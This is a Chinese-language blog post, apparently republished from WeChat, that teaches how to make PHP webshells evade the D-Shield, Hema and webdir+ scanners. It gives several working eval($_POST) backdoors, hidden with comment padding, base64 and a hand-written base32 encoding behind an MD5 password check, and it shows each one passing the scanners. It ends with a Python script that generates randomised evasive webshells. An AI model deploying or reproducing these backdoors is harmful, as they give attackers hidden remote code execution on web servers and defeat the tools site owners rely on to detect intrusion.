> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/etzMpxzn71_M2xeT_V5duw)

**0x00：简介 -**

此篇只讨论 php，其实原理是相同的，本文的思路依然适用于其他语言  
由于 php7.1 以后 assert 不能拆分了，所以此篇不使用 assert 函数作为核心，使用适用性更广的 eval。

免杀顺序依次为 D 盾 河马 webdir+  
**0x01：探究免杀**

**免杀 D 盾**  
首先我们需要了解免杀的原理，免杀其实就是绕过杀软的规则，而规则对我们来说是不透明的，但是可以根据 fuzz 探知个大概。

首先请出我们的一句话木马：

```
<?php @eval($_POST('a'));?>
```

无论如何混淆 webshell，我们期望最终得到的逻辑依然是这条代码，所以答案知道了，想办法混淆就行了。

经过对 D 盾的探测，可以知道，它对函数的检测其实是比较粗糙的，比如我们构造一个函数，让其返回值拼接为

```
eval($_POST['a'])
```

```
<?php

function x()
{

    return $_POST['a'];

}

eval(x());
?>
```

D 盾扫一下

![](https://mmbiz.qpic.cn/mmbiz_png/dAMlD06OYdJUjfSUfXxvV0uINLfUse46lHkY654EXkCTFbAV5oPTNfPwD3Upz4d7vWhYdEVaWlAFxiaJ86adsiag/640?wx_fmt=png)

被杀了，显然 D 盾并没有给出我们为什么这个会被杀，只说是已知后门，这里我们测试一下到底是什么东西被规则杀掉了。

首先，无论如何更改函数名，都会被杀掉，所以和函数名没关系，然后就是 eval 内的参数了，测试后发现，只要拼接成 eval($_POST['a']) 就会被杀，因此我们避免语句直接拼接为这样即可。

如何避免直接拼接呢 当然是往中间加料了 加一些既不会破坏语法又能起到隔离作用的东西，什么东西可以做到这样呢？当然就是注释了

比如这样的：

```
<?php

function x()
{

    return "/*sasas23123*/".$_POST['a']."/*sdfw3123*/";

}

eval(x());
?>
```

这里用两段注释在 "eval(" 与 "$_POST" 之间起到了隔离的作用，因此绕过了直接拼接这个规则，D 盾继续杀一下

![](https://mmbiz.qpic.cn/mmbiz_png/dAMlD06OYdJUjfSUfXxvV0uINLfUse46EkRd4Wz5BpEGsLryanMlzkRKMjfDJoicvLIDRwia1SbLrDXBEVRq5y9A/640?wx_fmt=png)

已经免杀成功，再看一下能否使用

![](https://mmbiz.qpic.cn/mmbiz_png/dAMlD06OYdJUjfSUfXxvV0uINLfUse46OUBPeKP7f9cTIn1lK0fk7ubXclanib3QgHiabMic6ICHEym5jxV5XTatA/640?wx_fmt=png)

既然如此，我们的核心绕过思路就是利用注释了，为了去除特征，必不可少的就是随机性了

使用函数返回值与 eval 拼接只是权宜之计，毕竟也是一条规则就能够被干掉的。

所以我们这里使用类和构造函数来替代主动调用函数，

```
<?php
class x
{

        function __construct()
        {      
                @eval("/*sasas23123*/".$_POST['a']."/*sdfw3123*/");
        }

}
new x();

?>
```

改到这里，我不禁想 如果 D 盾发狠把 ".$_POST['a']." 当独立规则，那岂不是也歇菜，所以，我决定使用 base64 编码将 "$_POST['a']" 转化一下

```
<?php
class x
{
        public $payload = null;
        public $decode_payload = null;
        function __construct()
        {       $this->payload='ZXZhbCgkX1BPU1RbYV0pOw==';
                $this->decode_payload = @base64_decode( $this->payload );
                @eval("/*sasas23123*/".$this->decode_payload."/*sdfw3123*/");
        }

}
new x();

?>
```

到现在为止，模板确认

后面就是写轮子了，至于轮子原理也很简单，就是将可以修改特征的参数名使用随机数填充，比如类名、public 变量名、用于混淆的注释字符等。  
代码如下：

```
import random

#author: pureqh
#github: https://github.com/pureqh/webshell


shell = '''<?php
class {0}{3}
        public ${1} = null;
        public ${2} = null;
        function __construct(){3}
        $this->{1}='ZXZhbCgkX1BPU1RbYV0pOw==';
        $this->{2} = @base64_decode( $this->{1} );
        @eval({5}.$this->{2}.{5});
        {4}{4}
new {0}();
?>'''


def random_keys(len):
    str = '`~-=!@#$%^&_+?<>|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))  

def build_webshell():
    className = random_name(4)
    parameter1 = random_name(5)
    parameter2 = random_name(6)
    lef = '''{'''
    rig = '''}'''
    disrupt = "\"/*"+random_keys(7)+"*/\""
    shellc = shell.format(className,parameter1,parameter2,lef,rig,disrupt)
    return shellc


if __name__ == '__main__':
    print (build_webshell())
```

**免杀河马**  
首先我们拿出之前的样本：

```
<?php
class YHUV{
        public $BSFRM = null;
        public $YVMQFW = null;
        function __construct(){
        $this->BSFRM='ZXZhbCgkX1BPU1RbYV0pOw==';
        $this->YVMQFW = @base64_decode( $this->BSFRM );
        @eval("/*rEgV_Cd*/".$this->YVMQFW."/*rEgV_Cd*/");
        }}
new YHUV();
?>
```

直接拿去河马查杀一下，

![](https://mmbiz.qpic.cn/mmbiz_png/dAMlD06OYdJUjfSUfXxvV0uINLfUse46m7gsPmtAru1VqZBFnXSPDKfDtunTZvvnwu7jV5qk9ay7NO07LVZibGg/640?wx_fmt=png)

它很可能通过拼接得到了 "eval($_POST[xxx]);"，所以认定为木马，那我加一层认证如何  

```
<?php
class BTAG{
        public $QOMYW = null;
        public $XGTCPL = null;
        public $YIOXAL = null;
        function __construct(){
            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){
        $this->QOMYW = 'ZXZhbCgkX1BPU';
        $this->YIOXAL = '1RbYV0pOw==';
        $this->XGTCPL = @base64_decode($this->QOMYW.$this->YIOXAL);
        @eval("/*#`|W$~Q*/".$this->XGTCPL."/*#`|W$~Q*/");
        }}}
new BTAG();
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/dAMlD06OYdJUjfSUfXxvV0uINLfUse46yjXbbk9sho5OoMcw3rV5icS9pJ0RN7ATemzibRYATab8MjNCP51aG21g/640?wx_fmt=png)

这个我是真没想到...  
**免杀 webdir+**  
官方说它会拿沙盒跑  

![](https://mmbiz.qpic.cn/mmbiz_png/dAMlD06OYdJUjfSUfXxvV0uINLfUse4613eUZptCQa1hd1IgxfsQtkwqaTD0iavfqAyia02ibEj3DJRQ7tcSgQozQ/640?wx_fmt=png)

我们拿绕过河马的马跑一下，这里的检测速度之所以比较慢就是因为它在跑沙盒，这种方式确实比传统的查杀工具难搞很多，但是它并不完美。  

由于 eval 依然无法动摇，所以我依旧从 "$_POST['a']" 下手, 首先这串字符编码后是过不去 webdir + 的，但是不编码也过不去，我猜测可能是沙盒在模拟运行的时候拼接出了 eval($_POST['a'])，导致被杀，那我使用 md5 做密钥它总跑不出来吧。修改代码如下：

```
<?php
class YHUV{
        public $BSFRM = null;
        public $YVMQFW = null;
        function __construct(){
            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){
                $this->BSFRM=$_POST['a'];
                @eval("/*rEgV_Cd*/".$this->BSFRM."/*rEgV_Cd*/");
            }
        }}
new YHUV();
?>
```

还是被杀了，我反而很高兴，那这也说明一个问题，你并没有顺利执行过我的马，那说明我 eval() 里的东西一直都是安全的，那么不安全的肯定就是 "$_POST['a']" 了，这个怎么解决呢？  
经过大量测试 我发现了一个事情 base64 不行了  
base64 不行了怎么办？我直接用 base32，php 没有自带的 base32？那就自己写

```
function base32_encode($input) {
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $output = '';
    $v = 0;
    $vbits = 0;

    for ($i = 0, $j = strlen($input); $i < $j; $i++) {
        $v <<= 8;
        $v += ord($input[$i]);
        $vbits += 8;

        while ($vbits >= 5) {
            $vbits -= 5;
            $output .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);
        }
    }

    if ($vbits > 0) {
        $v <<= (5 - $vbits);
        $output .= $BASE32_ALPHABET[$v];
    }

    return $output;
}

function base32_decode($input) {
    $output = '';
    $v = 0;
    $vbits = 0;

    for ($i = 0, $j = strlen($input); $i < $j; $i++) {
        $v <<= 5;
        if ($input[$i] >= 'a' && $input[$i] <= 'z') {
            $v += (ord($input[$i]) - 97);
        } elseif ($input[$i] >= '2' && $input[$i] <= '7') {
            $v += (24 + $input[$i]);
        } else {
            exit(1);
        }

        $vbits += 5;
        while ($vbits >= 8) {
            $vbits -= 8;
            $output .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);
        }
    }
    return $output;
}
```

shell 如下，直接使用 base32 处理 "eval($_POST[zero]);"

```
<?php
class ZQIH{
        public $a = null;
        public $b = null;
        public $c = null;

        function __construct(){
            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){

        $this->a = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';



        $this->LGZOJH = @base32_decode($this->a);
        @eval/*sopupi3240-=*/("/*iSAC[FH*/".$this->LGZOJH."/*iSAC[FH*/");
        }}}
new ZQIH();

function base32_encode($input) {
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $output = '';
    $v = 0;
    $vbits = 0;

    for ($i = 0, $j = strlen($input); $i < $j; $i++) {
        $v <<= 8;
        $v += ord($input[$i]);
        $vbits += 8;

        while ($vbits >= 5) {
            $vbits -= 5;
            $output .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);
        }
    }

    if ($vbits > 0) {
        $v <<= (5 - $vbits);
        $output .= $BASE32_ALPHABET[$v];
    }

    return $output;
}

function base32_decode($input) {
    $output = '';
    $v = 0;
    $vbits = 0;

    for ($i = 0, $j = strlen($input); $i < $j; $i++) {
        $v <<= 5;
        if ($input[$i] >= 'a' && $input[$i] <= 'z') {
            $v += (ord($input[$i]) - 97);
        } elseif ($input[$i] >= '2' && $input[$i] <= '7') {
            $v += (24 + $input[$i]);
        } else {
            exit(1);
        }

        $vbits += 5;
        while ($vbits >= 8) {
            $vbits -= 8;
            $output .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);
        }
    }
    return $output;
}
?>
```

继续查杀：

![](https://mmbiz.qpic.cn/mmbiz_png/dAMlD06OYdJUjfSUfXxvV0uINLfUse46brlTnACqnQiaFgtHEia9FZCn9Dw1Nj9jTV6f7iaaGoA6hNGzycw0nHXaw/640?wx_fmt=png)

能否运行：

![](https://mmbiz.qpic.cn/mmbiz_png/dAMlD06OYdJUjfSUfXxvV0uINLfUse46eXKL78IcDf5BL2YYBKCbEDViavtxkPwpDxrVBAiczqro4zH3MgA0Kqzg/640?wx_fmt=png)

至此，我们似乎找到了盲点，以后直接自己写加密完事了。可惜一句话木马也被写成一段话木马了。。。不过在渗透测试过程中完全可以将其拆分为多个文件互相调用。  
**0x02：批量代码**  
同样为了减少特征  
代码如下

```
import random

#author: pureqh
#github: https://github.com/pureqh/webshell
#use:GET:http://url?pass=pureqh POST:zero

shell = '''<?php
class {0}{1}
        public ${2} = null;
        public ${3} = null;
        function __construct(){1}
            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){1}
        $this->{2} = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->{3} = @{9}($this->{2});
        @eval({5}.$this->{3}.{5});
        {4}{4}{4}
new {0}();
function {6}(${7}){1}
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    ${8} = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen(${7}); $i < $j; $i++){1}
    $v <<= 8;
        $v += ord(${7}[$i]);
        $vbits += 8;
        while ($vbits >= 5) {1}
            $vbits -= 5;
            ${8} .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);{4}{4}
    if ($vbits > 0){1}
        $v <<= (5 - $vbits);
        ${8} .= $BASE32_ALPHABET[$v];{4}
    return ${8};{4}
function {9}(${7}){1}
    ${8} = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen(${7}); $i < $j; $i++){1}
        $v <<= 5;
        if (${7}[$i] >= 'a' && ${7}[$i] <= 'z'){1}
            $v += (ord(${7}[$i]) - 97);
        {4} elseif (${7}[$i] >= '2' && ${7}[$i] <= '7') {1}
            $v += (24 + ${7}[$i]);
        {4} else {1}
            exit(1);
        {4}
        $vbits += 5;
        while ($vbits >= 8){1}
            $vbits -= 8;
            ${8} .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);{4}{4}
    return ${8};{4}
?>'''


def random_keys(len):
    str = '`~-=!@#$%^&_+?<>|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))  

def build_webshell():
    className = random_name(4)
    lef = '''{'''
    parameter1 = random_name(4)
    parameter2 = random_name(4)
    rig = '''}'''
    disrupt = "\"/*"+random_keys(7)+"*/\""
    fun1 = random_name(4)
    fun1_vul = random_name(4)
    fun1_ret = random_name(4)
    fun2 = random_name(4)
    shellc = shell.format(className,lef,parameter1,parameter2,rig,disrupt,fun1,fun1_vul,fun1_ret,fun2)
    return shellc


if __name__ == '__main__':
    print (build_webshell())
```

**【往期推荐】**  

[未授权访问漏洞汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484804&idx=2&sn=519ae0a642c285df646907eedf7b2b3a&chksm=ea37fadedd4073c87f3bfa844d08479b2d9657c3102e169fb8f13eecba1626db9de67dd36d27&scene=21#wechat_redirect)

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)  

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)